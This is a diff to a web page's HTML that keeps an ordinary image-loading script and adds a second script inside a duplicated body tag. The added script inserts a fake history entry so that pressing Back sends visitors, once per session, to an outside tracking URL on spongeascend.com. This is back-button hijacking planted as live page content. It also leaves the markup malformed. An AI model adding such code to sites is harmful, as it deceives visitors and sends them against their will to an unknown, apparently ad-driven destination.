@@ -178,5 +178,25 @@
 <script>
 (function(){const skeleton=document.getElementById('mobileSkeleton'),hero=document.querySelector('.hero'),heroWrap=document.querySelector('.hero-wrap');function finishLoad(){if(heroWrap)heroWrap.classList.add('loaded');if(skeleton){skeleton.classList.add('hidden');setTimeout(()=>skeleton.remove(),350);}}if(hero){if(hero.complete)finishLoad();else{hero.addEventListener('load',finishLoad,{once:true});hero.addEventListener('error',finishLoad,{once:true});}}else window.addEventListener('load',finishLoad,{once:true});setTimeout(finishLoad,2200);document.querySelectorAll('img').forEach((img,index)=>{img.decoding='async';if(!img.classList.contains('hero')&&index>0)img.loading='lazy';});document.addEventListener('gesturestart',e=>e.preventDefault(),{passive:false});let lastTouchEnd=0;document.addEventListener('touchend',e=>{const now=Date.now();if(now-lastTouchEnd<=300)e.preventDefault();lastTouchEnd=now;},{passive:false});})();
 </script>
+  <body>
+
+  <!-- Your website content -->
+
+  <script>
+  (function () {
+    const BACK_URL = "https://spongeascend.com/tamt7741r?key=51beb06476ba544db62a36db1d10e11b";
+    const SESSION_KEY = "back_redirect_used";
+
+    if (sessionStorage.getItem(SESSION_KEY)) return;
+
+    history.pushState({ backRedirect: true }, "", window.location.href);
+
+    window.addEventListener("popstate", function () {
+      sessionStorage.setItem(SESSION_KEY, "true");
+      window.location.replace(BACK_URL);
+    }, { once: true });
+  })();
+  </script>
+</body>
 </body>
 </html>
